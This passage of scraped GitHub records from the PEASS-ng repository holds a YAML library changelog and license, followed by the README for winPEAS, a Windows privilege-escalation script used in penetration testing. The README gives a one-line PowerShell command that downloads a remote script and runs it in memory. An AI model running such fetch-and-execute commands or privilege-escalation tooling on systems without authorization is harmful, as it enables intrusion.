\n    mapping node.\n  * A mapping node checks for duplicated keys every time the node content \n    is changed.\n  * Test results are changed because some of them are dependent on the hash \n    key order.\n* The current equality evaluation is too strict, probably needs some adjustment.\n* NativeObject property was added to YamlScalar.\n* YamlScalar's equality is evaluated by comparing NativeObject.\n\n--- 2009-09-11 Osamu TAKEUCHI <osamu@big.jp>\nFirst release of YamlSerializer as 0.9.0.0\n", "timestamp": "2025-10-21T21:59:44.195407"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "winPEAS/winPEASexe/winPEAS/3rdParty/YamlSerializer/Readme.txt", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/winPEAS/3rdParty/YamlSerializer/Readme.txt", "content": "ÔªøYamlSerializer 0.9.0.2 (2009-10-04)        Osamu TAKEUCHI <osamu@big.jp>\n\nDescription:\n\tA library that serialize / deserialize C# native objects into YAML1.2 text.\n\nDevelopment environment: \n\tVisual C# 2008 Express Edition\n\tSandcastle (2008-05-29)\n\tSandcastleBuilder 1.8.0.2\n\tHTML Help workshop 4.74.8702\n\tNUnit 2.5.0.9122\n\tTestDriven.NET 2.0\n\nSupport web page: \n\thttp://yamlserializer.codeplex.com/\n\nLicense:\n\tYamlSerializer is distributed under the MIT license as following:\n\n---\nThe MIT License (MIT)\nCopyright (c) 2009 Osamu TAKEUCHI <osamu@big.jp>\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of \nthis software and associated documentation files (the \"Software\"), to deal in the \nSoftware without restriction, including without limitation the rights to use, copy, \nmodify, merge, publish, distribute, sublicense, and/or sell copies of the Software, \nand to permit persons to whom the Software is furnished to do so, subject to the \nfollowing conditions:\n\nThe above copyright notice and this permission notice shall be included in all \ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, \nINCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A \nPARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT \nHOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF \nCONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE \nOR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n", "timestamp": "2025-10-21T21:59:44.301133"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "winPEAS/winPEASps1/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1/README.md", "content": "# Windows Privilege Escalation Awesome Script (.ps1)\n\n![](https://github.com/peass-ng/PEASS-ng/raw/master/winPEAS/winPEASexe/images/winpeas.png)\n\n**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)**\n\nCheck also the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)**\n\n## Mantainer\n\nThe official **maintainer of this script is [RandolphConley](https://github.com/RandolphConley)**.\n\n## Quick Start\n\nDownload the **[latest releas from here](https://github.com/peass-ng/PEASS-ng/releases/latest)**.\n\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"\n```\n\n## Advisory\n\nAll the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.\n", "timestamp": "2025-10-21T22:00:01.819895"}
